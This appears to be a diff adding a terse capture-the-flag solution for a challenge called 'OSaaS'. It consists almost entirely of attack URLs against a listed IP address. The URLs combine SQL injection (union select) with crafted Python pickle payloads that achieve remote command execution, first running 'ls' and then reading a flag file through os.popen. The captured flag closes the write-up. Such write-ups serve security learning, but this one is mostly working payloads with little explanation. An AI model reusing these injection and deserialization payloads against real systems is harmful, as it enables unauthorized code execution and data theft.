@@ -1,0 +1,46 @@
+OSaaS is the new trend for 2016! Store your object directly in the cloud. Get rid of the hassle of managing your own storage for object with Osaas. Unickle currently offers a beta version that demonstrates how OSaaS will make the internet a better place... One object at a time!!
+
+http://54.84.124.93/
+
+
+Solution
+--------
+
+
+
+SQL Injection
+
+http://54.84.124.93/?cat=2%2b1+and+1=1/**/
+
+http://54.84.124.93/?cat=2%2b1+and+1=1+union+select+1,2,3,4/**/
+
+
+http://54.84.124.93/?cat=2+union+select+1,2,%22{aa,bb}%22,4/**/
+invalid load key, '{'.
+
+http://54.84.124.93/?cat=2+union+select+1,2,%22Magic%20Box%22,4/**/
+could not find MARK
+
+
+
+S'ls -l'%0ap1%0a.
+
+http://54.84.124.93/?cat=2+union+select+1,2,%22S%27ls%20-l%27%0ap1%0a.%22,4/**/
+
+
+cposix%0asystem%0ap1%0a(S'ls'%0ap2%0atp3%0aRp4%0a.
+
+cos%0asystem%0a(S'ls'%0atR.%0atR.
+
+http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,"cos%0Asystem%0A(S'ls'%0AtR.",4/**/
+
+
+S'Object: Box[name="Magic Box"]'%0ap1%0a.
+
+
+
+
+http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,%22c__builtin__%0Aeval%0A%28S%27os.popen%28%27cat%20/var/www/flag%27%29.readlines%28%29%27%0AtR.%22,4/**/
+
+
+flag{OSaaS_with_union_and_tickle_trend_it_is!}
